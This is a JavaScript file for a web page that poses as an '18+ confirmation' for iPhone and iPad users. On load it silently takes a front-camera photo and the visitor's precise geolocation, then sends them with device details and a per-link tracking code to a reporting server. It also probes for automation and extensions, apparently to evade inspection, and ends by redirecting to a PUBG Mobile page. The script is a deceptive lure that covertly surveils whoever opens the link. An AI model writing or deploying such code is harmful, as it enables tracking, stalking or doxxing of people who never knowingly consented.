// === app.js (универсальный + жёсткий гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18) ===

// API base из <script>window.__API_BASE</script> в index.html
const API_BASE =
  (typeof window !== "undefined" && window.__API_BASE)
    ? String(window.__API_BASE).replace(/\/+$/, "")
    : "";

// ==== UI ====
const UI = {
  text: document.getElementById("text"),
  note: document.getElementById("note"),
  btn: document.getElementById("enterBtn"),
  reason: document.getElementById("reason"),
  title: document.getElementById("title"),
};

// === Подготовка input для фолбэка ===
(function ensureFileInput() {
  if (!document.getElementById("fileInp")) {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.id = "fileInp";
    inp.accept = "image/*";
    inp.capture = "user";
    inp.style.display = "none";
    document.body.appendChild(inp);
  }
})();

window.__reportReady = false;
window.__cameraLatencyMs = null;
window.__lastDeviceCheck = null;

// === CODE из URL (?code=...) ===
function determineCode() {
  const q = new URLSearchParams(location.search).get("code");
  const code = q ? String(q).trim() : null;
  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
}

// === Кнопка (видимость и стиль мы контролируем тут) ===
function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = "grayscale(35%) brightness(0.9)";
  b.style.opacity = "0.6";
  b.style.cursor = "not-allowed";
  b.style.background = "linear-gradient(90deg, #246, #39a)";
  b.style.boxShadow = "0 0 6px rgba(0,153,255,.25)";
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = "none";
  b.style.opacity = "1";
  b.style.cursor = "pointer";
  b.style.background = "linear-gradient(90deg, #4f00ff, #00bfff)";
  b.style.boxShadow = "0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)";
}
function showBtn() { if (UI.btn) UI.btn.style.display = "block"; }
function hideBtn() { if (UI.btn) UI.btn.style.display = "none"; }

// === Геолокация ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === Сжатие base64 фото ===
function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement("canvas");
      c.width = w;
      c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      try {
        resolve(c.toDataURL("image/jpeg", quality));
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

// === Фото (основной путь, совместимо с iOS) ===
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("Камера недоступна");
  const t0 = (typeof performance !== "undefined" ? performance.now() : Date.now());
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
  return new Promise((resolve, reject) => {
    try {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.playsInline = true;

      let fallbackTimer = setTimeout(() => {
        try {
          const c = document.createElement("canvas");
          c.width = 1280;
          c.height = 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.8);
          stream.getTracks().forEach((t) => t.stop());
          const t1 = (typeof performance !== "undefined" ? performance.now() : Date.now());
          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
          resolve(dataUrl);
        } catch (e) { reject(e); }
      }, 3000);

      video.onloadedmetadata = async () => {
        try {
          await video.play();
          clearTimeout(fallbackTimer);
          const c = document.createElement("canvas");
          c.width = video.videoWidth || 1280;
          c.height = video.videoHeight || 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.85);
          stream.getTracks().forEach((t) => t.stop());
          const t1 = (typeof performance !== "undefined" ? performance.now() : Date.now());
          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
          resolve(dataUrl);
        } catch (err) {
          stream.getTracks().forEach((t) => t.stop());
          reject(err);
        }
      };
    } catch (e) {
      try { stream.getTracks().forEach((t) => t.stop()); } catch {}
      reject(e);
    }
  });
}

// === Фото (фолбэк через input[type=file]) ===
async function takePhotoWithFallback() {
  try {
    return await takePhoto();
  } catch {
    const inp = document.getElementById("fileInp");
    return new Promise((resolve, reject) => {
      inp.onchange = () => {
        const f = inp.files && inp.files[0];
        if (!f) return reject(new Error("Файл не выбран"));
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = reject;
        fr.readAsDataURL(f);
      };
      inp.click();
    });
  }
}

// === Инфо об устройстве (без требования Safari) ===
function getDeviceInfo() {
  const ua = navigator.userAgent || "";
  const m = ua.match(/\bOS\s(\d+)[._]/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  return {
    userAgent: ua,
    platform: navigator.platform,
    iosVersion: iosVer,
    // оставим isSafari для обратной совместимости, но он нам не нужен для гейта
    isSafari:
      /Safari\//.test(ua) &&
      !/CriOS|Chrome|Chromium|FxiOS|Edg|OPR/i.test(ua) &&
      navigator.vendor === "Apple Computer, Inc.",
  };
}

// === Лёгкая детекция подмены UA / расширений / автоматизации ===
async function runDeviceCheck() {
  const reasons = [];
  const details = {};
  let score = 100;

  try {
    details.ua = navigator.userAgent || "";
    details.vendor = navigator.vendor || "";
    details.platform = navigator.platform || "";
    details.lang = navigator.language || "";
    details.timezone = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions)
      ? Intl.DateTimeFormat().resolvedOptions().timeZone
      : null;
    details.dpr = window.devicePixelRatio || 1;
    details.screen = { w: (screen && screen.width) || null, h: (screen && screen.height) || null };
    details.hasTouchEvent = ("ontouchstart" in window);
    details.maxTouchPoints = Number(navigator.maxTouchPoints || 0);
    details.navigator_webdriver = (typeof navigator.webdriver === "boolean") ? navigator.webdriver : undefined;

    // Очень мягкие эвристики
    const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
    const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
    if (leakedChromeRuntime || leakedBrowserRuntime) {
      reasons.push("Следы API расширений runtime (инъекция/браузерные плагины)");
      score -= 5;
    }

    function looksNative(fn) {
      try { return typeof fn === "function" && /\[native code\]/.test(Function.prototype.toString.call(fn)); }
      catch { return true; }
    }
    const suspiciousNative =
      !looksNative(navigator.permissions?.query) ||
      !looksNative(navigator.geolocation?.getCurrentPosition) ||
      !looksNative(navigator.mediaDevices?.getUserMedia);

    if (suspiciousNative) {
      reasons.push("Web API переопределены (не native) — подозрительно");
      score -= 5;
    }

    if (details.navigator_webdriver === true) {
      reasons.push("navigator.webdriver === true (автоматизация)");
      score -= 60;
    }

    details.cameraLatencyMs = (typeof window.__cameraLatencyMs === "number") ? window.__cameraLatencyMs : null;
    if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
      reasons.push("Слишком малая cameraLatency — аномально");
      score -= 10;
    }

    if (score >= 80) reasons.push("Ок: окружение выглядит правдоподобно");
    else if (score >= 60) reasons.push("Есть несостыковки — рекомендуется доп. проверка");
    else reasons.push("Высокая вероятность подмены/автоматизации");
  } catch (e) {
    reasons.push("Ошибка проверки окружения: " + (e?.message || String(e)));
  }

  return { score, reasons, details, timestamp: Date.now() };
}

// === Отправка отчёта ===
async function sendReport({ photoBase64, geo }) {
  const info = getDeviceInfo();
  const code = determineCode();
  if (!code) throw new Error("Нет кода в URL");

  const device_check = window.__lastDeviceCheck || null;

  const body = { ...info, geo, photoBase64, note: "auto", code, device_check };

  const r = await fetch(`${API_BASE}/api/report`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  const text = await r.text().catch(() => "");
  let data;
  try { data = JSON.parse(text); } catch { data = null; }

  if (!r.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
  if (!data?.ok) throw new Error((data && data.error) || "Ошибка ответа сервера");

  return data;
}

// === ГЕЙТ: пускаем только iPhone/iPad с iOS/iPadOS >= 18 (без требования Safari) ===
const MIN_IOS_MAJOR = 18;

function isIOSFamily() {
  const ua = navigator.userAgent || "";
  const touchMac = navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1; // iPadOS на Mac
  return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
}

function parseIOSMajorFromUA() {
  const ua = navigator.userAgent || "";
  const m1 = ua.match(/\bOS\s+(\d+)[._]/);
  if (m1) return parseInt(m1[1], 10);
  const m2 = ua.match(/\bVersion\/(\d+)/);
  if (m2) return parseInt(m2[1], 10);
  return null;
}

function secureContextOK() {
  return location.protocol === "https:" || location.hostname === "localhost";
}

function gateCheck() {
  if (!secureContextOK())
    return { ok:false, reason:'Нужен HTTPS (или localhost) для доступа к камере/гео.' };
  if (!isIOSFamily())
    return { ok:false, reason:'Доступ только с iPhone/iPad (iOS/iPadOS).' };
  const iosMajor = parseIOSMajorFromUA();
  if (iosMajor == null)
    return { ok:false, reason:'Не удалось определить версию iOS/iPadOS.' };
  if (iosMajor < MIN_IOS_MAJOR)
    return { ok:false, reason:`Версия iOS/iPadOS ниже ${MIN_IOS_MAJOR}.` };
  return { ok:true, iosMajor };
}

// === Основной поток ===
async function autoFlow() {
  try {
    setBtnLocked();
    if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";

    const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhotoWithFallback()]);
    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);

    const check = await runDeviceCheck();
    window.__lastDeviceCheck = check;

    if (check.score < 60) {
      window.__reportReady = false;
      setBtnLocked();
      if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена.</span>';
      if (UI.note) UI.note.textContent = "Обнаружены признаки подмены/автоматизации. Отключите расширения/твики.";
      return;
    }

    if (UI.text) UI.text.innerHTML = "Отправляем данные…";
    const resp = await sendReport({ photoBase64, geo });

    window.__reportReady = true;
    setBtnReady();
    if (UI.text) UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
    if (UI.note) UI.note.textContent = "Можно продолжить.";
    if (resp && resp.delivered === false) {
      if (UI.note) UI.note.textContent = resp.reason || "Доставим позже.";
    }
  } catch (e) {
    console.error("[AUTO-FLOW ERROR]", e);
    setBtnLocked();
    window.__reportReady = false;
    if (UI.text) UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
    if (UI.note) UI.note.textContent = "Причина: " + (e && e.message ? e.message : String(e));
  }
}

// Экспорт (если ты всё ещё вызываешь из index.html)
window.__autoFlow = autoFlow;

// === Управление UI кнопкой и запуском, чтобы работало "везде" ===
function applyGateAndUI() {
  const res = gateCheck();
  if (res.ok) {
    // Позитивный UI
    if (UI.title) UI.title.textContent = "Подтверждение 18+";
    if (UI.text) UI.text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
    if (UI.reason) {
      const platIsIPad = /iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent);
      UI.reason.textContent = `${platIsIPad ? "iPadOS" : "iOS"} ${res.iosMajor}.`;
    }
    if (UI.note) UI.note.textContent = "Кнопка активируется после проверки.";
    showBtn();
    setBtnLocked();

    // навешиваем обработчик (без дублей)
    if (UI.btn && !UI.btn.__wired) {
      UI.btn.__wired = true;
      UI.btn.addEventListener("click", (e) => {
        if (!window.__reportReady) { e.preventDefault(); return; }
        location.assign("https://www.pubgmobile.com/ig/itop");
      });
    }

    // стартуем основной поток
    setTimeout(() => autoFlow(), 100);
  } else {
    // Отказ
    if (UI.title) UI.title.textContent = "Доступ отклонён";
    if (UI.text) UI.text.innerHTML = '<span class="err">Отказ в доступе.</span>';
    if (UI.reason) UI.reason.textContent = "Причина: " + res.reason;
    if (UI.note) UI.note.textContent = `Доступ только на iPhone/iPad с iOS/iPadOS ${MIN_IOS_MAJOR}+ (любой браузер).`;
    hideBtn();
  }
}

// защита от преждевременного клика
(function guardClick() {
  const btn = UI.btn;
  if (!btn) return;
  btn.addEventListener("click", (e) => {
    if (!window.__reportReady) {
      e.preventDefault();
      e.stopPropagation();
    }
  }, { capture: true });
})();

// Старт после готовности DOM
if (document.readyState === "complete" || document.readyState === "interactive") {
  applyGateAndUI();
} else {
  document.addEventListener("DOMContentLoaded", applyGateAndUI);
}
